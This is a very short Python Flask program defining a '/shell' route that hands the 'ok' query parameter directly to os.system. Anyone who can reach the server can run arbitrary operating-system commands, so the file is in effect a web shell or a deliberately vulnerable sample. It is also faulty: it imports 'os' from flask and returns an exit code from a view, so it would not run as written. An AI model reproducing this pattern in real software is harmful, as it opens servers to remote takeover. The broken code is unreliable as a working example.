import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/shell')
def cmd():
    return os.system(request.args.get('ok'))

if __name__ == "__main__":
	app.run()